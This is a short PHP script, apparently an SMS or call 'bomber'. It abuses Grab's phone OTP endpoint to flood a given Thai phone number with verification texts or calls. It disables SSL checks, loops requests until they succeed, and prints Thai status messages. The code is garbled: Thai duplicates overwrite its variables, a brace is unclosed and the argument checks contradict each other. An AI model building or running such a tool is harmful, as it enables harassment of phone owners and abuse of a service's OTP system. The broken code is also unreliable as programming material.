<?php

$argv[1] = substr($argv[1], 1);

$argv[1] = "66".$argv[1];

if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL", "ALL"]))) {

	echo "php grab.php <0650744651> <SMS|CALL|ALL>";	exit;

if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["rizzกอน", "0650744651", "1000000000000000"]))) {
	echo "php run= <ใส่เบอร์โทร> <ข้อความ|โทร|ทั้งหมด>";
	exit;
} elseif (!isset($argv[2])) {

	$argv[2] = "SMS";

	$argv[2] = "rizzกอนนะอ้าย";
}

$countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];

$countries = ["ไทย"];
shuffle($countries);

$i = 0;

foreach ($countries as $countryCode) {

		$success = false;

		while (!$success) {

			foreach (["SMS", "CALL"] as $method) {

			foreach (["ข้อความ", "โทร"] as $method) {
				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {

					$result = @file_get_contents("https://api.grab.com/grabid/v1/phone/otp", false, stream_context_create([

						"http" => [

							"method" => "POST",

							"header" => "Content-type: application/x-www-form-urlencoded",

							"content" => "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4"

						],

						"ssl" => [

							"verify_peer" => false,

							"verify_peer_name" => false

						]

					]));

					if ($result) {

						echo "[WHITE] §aโหลดสำเร็จ หมายเลข: ".$argv[1]." Country: ".$countryCode." Mode: ".$method."\n";

						echo "[WHITE] หมายเลข: ".$argv[1]." ประเทศ: ".$countryCode." โหมดที่ใช้ยิง: ".$method."\n";
						$success = true;

					}

				}

			}

		}

	}

?>
